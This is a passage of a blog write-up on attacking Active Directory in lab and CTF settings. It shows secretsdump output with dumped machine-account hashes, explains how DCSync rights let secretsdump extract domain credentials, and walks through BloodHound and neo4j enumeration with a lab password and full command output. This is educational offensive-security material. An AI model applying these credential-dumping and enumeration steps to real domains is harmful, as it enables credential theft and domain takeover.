ATTACKTIVEDIREC$:aes128-cts-hmac-sha1-96:d5557947610c7386479ea2a67243d8fa
ATTACKTIVEDIREC$:des-cbc-md5:ef766eea733d975d
[*] Cleaning up... 
```

## Why is this happening?

- - -

This is because the `DCSync` rights, as we can see in this screenshot, the `backup` user has **direct** rights of `DCSync` to the Domain Controller, so thats the main reason we can exploit this with `secretsdump.py`.

![](/assets/img/AttacktiveDirectory/4.png)

## How it works?

- - -

`impacket-secretsdump.py` is a tool included in the Impacket Python library that is used to extract and dump credentials stored in a Windows domain controller. This tool exploits weaknesses in the authentication and password storage protocols used in Windows systems.

When you run `impacket-secretsdump.py`, you need to provide the necessary credentials to authenticate to the Windows domain controller. Once authenticated, the tool gathers information about user accounts and credentials stored in the domain controller.

Next, the tool uses various techniques to extract the credentials stored in the domain controller. These techniques include dumping password hashes stored in the Security Account Manager (SAM) database file (NTDS.dit), retrieving plaintext passwords stored in the Local Security Authority (LSA), and extracting hashes stored in memory dump files (if provided).

Once the credentials have been extracted, `impacket-secretsdump.py` presents them in a readable format. This includes usernames, password hashes, and other information related to user accounts and credentials stored in the domain controller.

# BloodHound & neo4j

- - -

To see al the DC info **clearly**, we are going to use `bloodhound` and `neo4j`. You can install those tools by executing `apt install bloodhound neo4j`.

## Usage

- - -

First we'll launch `neo4j`:

```zsh
❯ neo4j console
Directories in use:
home:         /usr/share/neo4j
config:       /usr/share/neo4j/conf
logs:         /etc/neo4j/logs
plugins:      /usr/share/neo4j/plugins
import:       /usr/share/neo4j/import
data:         /etc/neo4j/data
certificates: /usr/share/neo4j/certificates
licenses:     /usr/share/neo4j/licenses
run:          /var/lib/neo4j/run
Starting Neo4j.
2023-05-26 18:51:26.582+0000 INFO  Starting...
2023-05-26 18:51:27.178+0000 INFO  This instance is ServerId{c41028bc} (c41028bc-cbe5-43c0-b7e2-f385765cee37)
2023-05-26 18:51:28.689+0000 INFO  ======== Neo4j 4.4.16 ========
2023-05-26 18:51:31.632+0000 INFO  Initializing system graph model for component 'security-users' with version -1 and status UNINITIALIZED
2023-05-26 18:51:31.652+0000 INFO  Setting up initial user from defaults: neo4j
2023-05-26 18:51:31.654+0000 INFO  Creating new user 'neo4j' (passwordChangeRequired=true, suspended=false)
2023-05-26 18:51:31.725+0000 INFO  Setting version for 'security-users' to 3
2023-05-26 18:51:31.740+0000 INFO  After initialization of system graph model component 'security-users' have version 3 and status CURRENT
2023-05-26 18:51:31.769+0000 INFO  Performing postInitialization step for component 'security-users' with version 3 and status CURRENT
2023-05-26 18:51:32.304+0000 INFO  Bolt enabled on localhost:7687.
2023-05-26 18:51:33.722+0000 INFO  Remote interface available at http://localhost:7474/
2023-05-26 18:51:33.727+0000 INFO  id: C94AC294EDBF9F6030AEED4120BDA65989713EEA735AC7E31718A2EEA25CD947
2023-05-26 18:51:33.727+0000 INFO  name: system
2023-05-26 18:51:33.728+0000 INFO  creationDate: 2023-05-26T18:51:29.548Z
2023-05-26 18:51:33.728+0000 INFO  Started.
```

By the other side, we'll launch `bloodhound`:

```zsh
❯ bloodhound &>/dev/null &
[1] 522090

❯ disown
```

The default credentials are `neo4j:neo4j`:

![](/assets/img/AD/15.png)

This tool will allows you to create a croquis of the DC. 
To make `bloodhound` shows info, you will need to upload a zip file. 
There is a resource called [SharpHound](https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.ps1). We'll use this to get the zip file.
For that, we'll run the tool [bloodhound.py](https://github.com/fox-it/BloodHound.py):

```zsh
❯ python3 bloodhound.py -u Administrator -p 'P@$$w0rd!' -d ruycr4ft.local -ns 192.168.0.115 -c all --zip
INFO: Found AD domain: ruycr4ft.local
INFO: Getting TGT for user
INFO: Connecting to LDAP server: win-fv8s9vu238j.ruycr4ft.local
INFO: Kerberos auth to LDAP failed, trying NTLM
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 3 computers
INFO: Connecting to LDAP server: win-fv8s9vu238j.ruycr4ft.local
INFO: Kerberos auth to LDAP failed, trying NTLM
INFO: Found 8 users
INFO: Found 52 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 22 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: SPonce-PC.ruycr4ft.local
INFO: Querying computer: Ramlux-PC.ruycr4ft.local
INFO: Querying computer: WIN-FV8S9VU238J.ruycr4ft.local
WARNING: Failed to get service ticket for SPonce-PC.ruycr4ft.local, falling back to NTLM auth
WARNING: Failed to get service ticket for WIN-FV8S9VU238J.ruycr4ft.local, falling back to NTLM auth
CRITICAL: CCache file is not found. Skipping...
CRITICAL: CCache file is not found. Skipping...
WARNING: Failed to get service ticket for Ramlux-PC.ruycr4ft.local, falling back to NTLM auth
CRITICAL: CCache file is not found. Skipping...
WARNING: DCE/RPC connection failed: [Errno Connection error (win-fv8s9vu238j.ruycr4ft.local:88)] [Errno -2] Name or service not known
WARNING: DCE/RPC connection failed: [Errno Connection error (win-fv8s9vu238j.ruycr4ft.local:88)] [Errno -2] Name or service not known
WARNING: DCE/RPC connection failed: [Errno Connection error (win-fv8s9vu238j.ruycr4ft.local:88)] [Errno -2] Name or service not known
INFO: Done in 00M 03S
INFO: Compressing output into 20230526213904_bloodhound.zip
```

Now, from `bloodhound` we'll upload the zip file:

![](/assets/img/AD/16.png)

![](/assets/img/AD/17.png)

Now in `Analysis` you can see all info pretty clear:

![](/assets/img/AD/18.png)

![](/assets/img/AD/19.png)

# Conclusions

- - -

I love AD, and I tried to explain it the best I could. Of course, there are a lot more of attacks. I will maybe post a second part, I really don't know, but the next post will be the machine `Absolute`, from HTB (an AD machine by the way). I hope you like this notes!

See you!

